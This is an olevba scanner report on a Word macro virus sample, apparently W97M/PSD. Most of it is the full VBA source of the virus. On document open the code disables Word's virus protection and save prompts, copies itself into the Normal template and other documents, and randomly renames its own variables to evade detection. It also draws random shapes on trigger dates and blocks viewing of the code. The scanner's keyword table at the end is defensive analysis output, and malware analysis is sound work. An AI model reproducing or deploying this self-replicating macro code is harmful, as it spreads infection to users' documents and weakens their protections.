olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Psd.b-71912b33196a64ce7ffc504a4d495da31003f93d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Psd.b-71912b33196a64ce7ffc504a4d495da31003f93d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If Day(Now) = Minute(Now) Then
Randomize: For GI3627 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next GI3627: End If
GC1285 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
FH3861 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set UQ9972 = ActiveDocument.VBProject.VBComponents.Item(1)
OD8572 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set UQ9972 = NormalTemplate.VBProject.VBComponents.Item(1)
AO3373 = True
Call LI8648_LU7471
ActiveDocument.Saved = True
End If
If AO3373 <> True And OD8572 <> True Then GoTo AM9346
If AO3373 = True Then UQ9972.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, GC1285 - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "Application.Quit SaveChanges:=wdDoNotSaveChanges" & vbCr & "End Sub")
If OD8572 = True Then UQ9972.CodeModule.AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, FH3861 - 4))
AM9346:
If FH3861 <> 0 And GC1285 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub 'W97M/PSD.II ...logically delicious! [(c)1998 ALT-F11 code hack]
Private Function LI8648_LU7471()
On Error Resume Next
Randomize
Dim r1(1 To 15) As String
r1(1) = "NP5217": r1(2) = "JA5076": r1(3) = "HJ7357": r1(4) = "PJ1075": r1(5) = "LU7471": r1(6) = "GC1285"
r1(7) = "FH3861": r1(8) = "OD8572":: r1(9) = "UQ9972": r1(10) = "AO3373": r1(11) = "AM9346": r1(12) = "LI8648": r1(13) = "GU971": r1(14) = "CD5223": r1(15) = "GI3627"
For GI3627 = 1 To 15
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call LU7471(a1, r1(GI3627))
Next GI3627
End Function 'VAMP v1.0 [thanks Vic!]
Private Function LU7471(CD5223, GU971 As String)
On Error Resume Next
Dim NP5217 As Long: Dim JA5076 As Long: Dim HJ7357 As Long: Dim PJ1075 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
NP5217 = 1: JA5076 = 1: HJ7357 = .CountOfLines: PJ1075 = Len(.Lines(.CountOfLines, 1))
Do While .Find(GU971, NP5217, JA5076, HJ7357, PJ1075, True)
strline = .Lines(NP5217, 1)
strline = Left(strline, JA5076 - 1) & CD5223 & Mid(strline, PJ1075)
.replaceline NP5217, strline
NP5217 = HJ7357 + 1: JA5076 = 1:
HJ7357 = .CountOfLines
PJ1075 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

